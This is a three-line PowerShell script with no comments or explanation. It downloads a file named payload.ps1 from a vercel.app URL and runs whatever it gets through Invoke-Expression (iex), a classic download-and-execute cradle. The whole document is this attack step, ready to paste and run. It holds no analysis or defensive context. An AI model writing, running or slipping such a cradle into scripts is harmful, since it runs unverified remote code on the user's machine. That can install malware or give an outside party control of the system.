$payload = "https://testando123-blond.vercel.app/payload.ps1"
$bytes = Invoke-WebRequest -Uri $payload -UseBasicParsing | Select-Object -ExpandProperty Content
iex ([System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($bytes)))
